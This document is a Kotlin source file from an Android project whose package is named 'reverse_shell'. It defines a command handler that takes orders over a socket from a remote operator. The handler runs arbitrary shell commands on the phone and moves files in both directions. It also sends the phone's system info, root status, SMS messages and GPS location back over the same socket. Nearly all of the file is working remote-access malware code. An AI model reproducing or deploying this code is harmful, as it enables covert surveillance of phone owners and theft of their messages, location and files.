package com.satwik.nexgenius.core.reverse_shell

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.FileOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.Socket

object CommandHandler {

    fun handleSysInfo(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((getSystemInfo() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray()) //Shows shell interface again after executing custom command

    }

    fun handleCheckRoot(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((checkRoot() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())

    }

    fun handleHelp(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((help() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())

    }

    fun handleExit(socket: Socket, process: Process) {
        socket.close()
        process.destroy()
    }

    fun handleGetSms(socketOutput: OutputStream, context: Context, shellOutput: OutputStream) {
        socketOutput.write((getSms(context) + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())

    }

    fun handleShellCommand(command: String, shellOutput: OutputStream, socketOutput: OutputStream) {

        if(command.isEmpty()){
            val message = "Error: please enter a shell command or type 'help' to get a list of commands"
            socketOutput.write((message + "\n").toByteArray())
            shellOutput.write(("\n").toByteArray())

        }
        else {
            shellOutput.write((command + "\n").toByteArray())
            shellOutput.flush()
        }


    }

    fun handleDownload(command: String, socketOutput: OutputStream, socketInput: InputStream) {
        val filePath = command.substringAfter("download ").trim()
        val sendResult = sendFile(filePath, socketOutput)
        socketOutput.write((sendResult + "\n").toByteArray())

        val fileName = filePath.substringAfterLast('/')
        receiveFile(socketInput, fileName)

        socketOutput.write((filePath + "\n").toByteArray())
        socketOutput.flush()
    }



    private fun receiveFile(socketInput: InputStream, fileName: String){
        println("Receive")
        FileOutputStream(fileName).use { fileOutputStream ->
            val size = socketInput.read().toLong() // read file size
            val buffer = ByteArray(4 * 1024)
            var bytesRead = 0
            var remainingSize = size

            while (remainingSize > 0 && socketInput.read(buffer, 0, minOf(buffer.size, remainingSize.toInt())).also { bytesRead = it } != -1) {
                // Here we write the file using write method
                fileOutputStream.write(buffer, 0, bytesRead)
                remainingSize -= bytesRead // read up to file size
            }
            fileOutputStream.close()
            println("File received")
        }

    }

    suspend fun handleCurrentLocation(context: Context, socketOutput: OutputStream, shellOutput: OutputStream)= withContext(Dispatchers.IO){
        try {
            val latitude = getCurrentLocation(context).latitude.toString()
            val longitude = getCurrentLocation(context).longitude.toString()
            socketOutput.write(("Latitude: $latitude\nLongitude: $longitude\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())

        }
        catch (e:Exception){
            socketOutput.write(("Error: ${e.message}\n").toByteArray())
            socketOutput.flush()
        }
    }
}